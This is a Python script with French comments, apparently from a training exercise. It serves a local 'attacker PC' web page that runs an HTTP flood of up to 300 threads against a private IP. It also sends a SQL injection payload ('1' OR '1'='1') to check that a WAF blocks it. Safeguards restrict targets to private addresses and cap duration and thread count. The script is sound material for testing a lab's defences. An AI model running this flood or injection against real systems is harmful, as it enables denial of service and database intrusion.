#!/usr/bin/env python3
"""Interface web d'attaque — À LANCER SUR LE PC ATTAQUANT.

Sert une page web locale (http://localhost:8080) qui déclenche les mêmes attaques que
flood.py / sqli.sh, mais depuis un navigateur. L'attaque part donc bien du PC Attaquant
vers l'IP du PC Hôte (séparation attaquant / SI conservée, conforme au dossier).

Dépendances : aucune (bibliothèque standard uniquement), comme flood.py.
Lancement : python3 webattack.py   puis ouvrir http://localhost:8080

Périmètre STRICT : la cible est restreinte aux adresses privées (10.x / 192.168.x /
172.16-31.x / localhost). On ne peut pas viser Internet par accident.
"""
import json
import ipaddress
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LISTEN_PORT = 8090
MAX_DURATION = 120      # garde-fou : pas d'attaque interminable
MAX_CONCURRENCY = 300   # garde-fou : pas de débit délirant

# --- État partagé de l'attaque en cours (un seul flood à la fois, suffisant pour la démo) ---
state = {
    "running": False,
    "sent": 0,
    "errors": 0,
    "started_at": None,
    "duration": 0,
    "target": "",
    "last_result": "",
}
_lock = threading.Lock()
_stop = threading.Event()


def _is_private_target(url: str) -> bool:
    """N'autorise que les cibles privées (SI fictif). Refuse toute IP/host public."""
    try:
        host = urllib.parse.urlparse(url).hostname or ""
        if host in ("localhost", "127.0.0.1"):
            return True
        return ipaddress.ip_address(host).is_private
    except Exception:
        return False


def _flood_worker(url: str):
    while not _stop.is_set():
        try:
            urllib.request.urlopen(url, timeout=2).read()
        except Exception:
            with _lock:
                state["errors"] += 1
        with _lock:
            state["sent"] += 1


def _run_flood(target: str, path: str, duration: int, concurrency: int):
    url = target.rstrip("/") + path
    with _lock:
        state.update(running=True, sent=0, errors=0, started_at=time.time(),
                     duration=duration, target=url, last_result="")
    _stop.clear()
    threads = [threading.Thread(target=_flood_worker, args=(url,), daemon=True)
               for _ in range(concurrency)]
    for t in threads:
        t.start()
    # Attente de la durée OU d'un stop manuel
    deadline = time.time() + duration
    while time.time() < deadline and not _stop.is_set():
        time.sleep(0.2)
    _stop.set()
    time.sleep(1)
    with _lock:
        state["running"] = False
        state["last_result"] = f"{state['sent']} requêtes envoyées, {state['errors']} erreurs/timeouts"


def _run_sqli(target: str) -> dict:
    """Injection SQL — on ATTEND un 403 du WAF (blocage), pas un 200."""
    payload = "1' OR '1'='1"
    qs = urllib.parse.urlencode({"id": payload})
    url = target.rstrip("/") + "/accounts?" + qs
    try:
        req = urllib.request.Request(url, method="GET")
        code = urllib.request.urlopen(req, timeout=5).status
    except urllib.error.HTTPError as e:
        code = e.code
    except Exception as e:
        return {"code": None, "blocked": False, "msg": f"Erreur réseau : {e}"}
    blocked = (code == 403)
    msg = ("OK : le WAF a bloqué l'injection (403)." if blocked
           else f"Attention : non bloqué (code {code}). Vérifier MODSEC_RULE_ENGINE=On.")
    return {"code": code, "blocked": blocked, "msg": msg}


class Handler(BaseHTTPRequestHandler):
    def _json(self, obj, status=200):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass  # silence : on ne pollue pas la console

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/index"):
            body = PAGE.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/state":
            with _lock:
                self._json(dict(state))
        else:
            self._json({"error": "not found"}, 404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        try:
            data = json.loads(self.rfile.read(length) or b"{}")
        except Exception:
            data = {}
        target = (data.get("target") or "").strip()

        if not _is_private_target(target):
            return self._json({"error": "Cible refusée : adresse privée uniquement "
                                        "(10.x / 192.168.x / 172.16-31.x / localhost)."}, 400)

        if self.path == "/flood":
            with _lock:
                if state["running"]:
                    return self._json({"error": "Une attaque est déjà en cours."}, 409)
            duration = max(1, min(int(data.get("duration", 40)), MAX_DURATION))
            concurrency = max(1, min(int(data.get("concurrency", 120)), MAX_CONCURRENCY))
            path = data.get("path", "/health")
            threading.Thread(target=_run_flood,
                             args=(target, path, duration, concurrency), daemon=True).start()
            return self._json({"ok": True, "duration": duration, "concurrency": concurrency})

        if self.path == "/stop":
            _stop.set()
            return self._json({"ok": True})

        if self.path == "/sqli":
            return self._json(_run_sqli(target))

        self._json({"error": "not found"}, 404)


PAGE = """<!doctype html>
<html lang="fr"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PC Attaquant — RESILIENCE-ALPHA</title>
<style>
  :root { color-scheme: light dark; --bg:#0f1115; --card:#1a1d24; --fg:#e6e6e6;
          --accent:#ef4444; --ok:#22c55e; --muted:#8b93a1; }
  * { box-sizing:border-box; }
  body { margin:0; font-family:system-ui,Segoe UI,sans-serif; background:var(--bg); color:var(--fg);
         padding:24px; max-width:720px; margin:0 auto; }
  h1 { font-size:1.4rem; } h1 small{ color:var(--muted); font-weight:400; font-size:.8rem; }
  .card { background:var(--card); border:1px solid #2a2f3a; border-radius:14px; padding:18px; margin:14px 0; }
  label { display:block; font-size:.8rem; color:var(--muted); margin:10px 0 4px; }
  input { width:100%; padding:9px 11px; border-radius:9px; border:1px solid #333; background:#111; color:var(--fg); }
  .row { display:flex; gap:12px; } .row > div{ flex:1; }
  button { border:0; border-radius:10px; padding:11px 16px; font-weight:600; cursor:pointer; margin-top:12px; }
  .attack { background:var(--accent); color:#fff; } .stop{ background:#374151; color:#fff; }
  .sqli { background:#f59e0b; color:#111; }
  .stat { font-size:2rem; font-weight:700; } .stat.err{ color:var(--accent); }
  .grid { display:flex; gap:24px; } .grid > div{ flex:1; }
  .pill { display:inline-block; padding:3px 10px; border-radius:999px; font-size:.75rem; }
  .pill.idle{ background:#374151; } .pill.run{ background:var(--accent); } .pill.done{ background:var(--ok); color:#052e16; }
  .log { font-family:ui-monospace,monospace; font-size:.8rem; color:var(--muted); white-space:pre-wrap; max-height:160px; overflow:auto; }
  .ok { color:var(--ok); } .bad{ color:var(--accent); }
</style></head>
<body>
  <h1>PC Attaquant <small>— vise le SI fictif via l'IP du PC Hôte</small></h1>

  <div class="card">
    <label>Cible (IP:port du PC Hôte — adresse privée uniquement)</label>
    <input id="target" placeholder="http://10.44.67.201:8000" value="http://10.44.67.201:8000">
    <div class="row">
      <div><label>Durée (s)</label><input id="duration" type="number" value="40" min="1" max="120"></div>
      <div><label>Concurrence (threads)</label><input id="concurrency" type="number" value="120" min="1" max="300"></div>
    </div>
  </div>

  <div class="card">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <strong>Attaque principale — Flood (disponibilité)</strong>
      <span id="pill" class="pill idle">inactif</span>
    </div>
    <div class="grid" style="margin-top:14px">
      <div><div class="stat" id="sent">0</div><label>requêtes envoyées</label></div>
      <div><div class="stat err" id="errors">0</div><label>erreurs / timeouts</label></div>
    </div>
    <button class="attack" onclick="startFlood()">Lancer le flood</button>
    <button class="stop" onclick="stopFlood()">Stop</button>
  </div>

  <div class="card">
    <strong>Attaque secondaire — Injection SQL (compromission)</strong>
    <p style="color:var(--muted);font-size:.85rem">Résultat attendu : <b>403</b> (bloquée par le WAF).</p>
    <button class="sqli" onclick="runSqli()">Envoyer l'injection SQL</button>
    <div id="sqliResult" style="margin-top:10px"></div>
  </div>

  <div class="card"><label>Journal</label><div class="log" id="log"></div></div>

<script>
const $ = id => document.getElementById(id);
function log(m){ const t=new Date().toLocaleTimeString(); $('log').textContent = `[${t}] ${m}\\n` + $('log').textContent; }
function body(){ return { target: $('target').value.trim(),
  duration: +$('duration').value, concurrency: +$('concurrency').value }; }

async function startFlood(){
  const r = await fetch('/flood', {method:'POST', body: JSON.stringify(body())});
  const d = await r.json();
  if(d.error){ log('✗ ' + d.error); return; }
  log(`Flood lancé → ${d.duration}s, ${d.concurrency} threads`);
}
async function stopFlood(){ await fetch('/stop',{method:'POST',body:JSON.stringify(body())}); log('Stop demandé'); }
async function runSqli(){
  const r = await fetch('/sqli', {method:'POST', body: JSON.stringify(body())});
  const d = await r.json();
  if(d.error){ $('sqliResult').innerHTML = `<span class="bad">✗ ${d.error}</span>`; return; }
  const cls = d.blocked ? 'ok' : 'bad';
  $('sqliResult').innerHTML = `<span class="${cls}">Code HTTP ${d.code ?? '—'} — ${d.msg}</span>`;
  log(`Injection SQL → code ${d.code}`);
}

// Rafraîchit les compteurs en direct
setInterval(async () => {
  try {
    const s = await (await fetch('/state')).json();
    $('sent').textContent = s.sent; $('errors').textContent = s.errors;
    const pill = $('pill');
    if(s.running){ pill.className='pill run'; pill.textContent='attaque en cours'; }
    else if(s.last_result){ pill.className='pill done'; pill.textContent='terminé';
      if(!window._done || window._done!==s.last_result){ window._done=s.last_result; log('Terminé : '+s.last_result); } }
    else { pill.className='pill idle'; pill.textContent='inactif'; }
  } catch(e){}
}, 1000);
</script>
</body></html>
"""


if __name__ == "__main__":
    print(f"[webattack] Interface d'attaque sur http://localhost:{LISTEN_PORT}")
    print("[webattack] Ouvre ce lien dans ton navigateur. Cible = IP du PC Hôte.")
    ThreadingHTTPServer(("0.0.0.0", LISTEN_PORT), Handler).serve_forever()
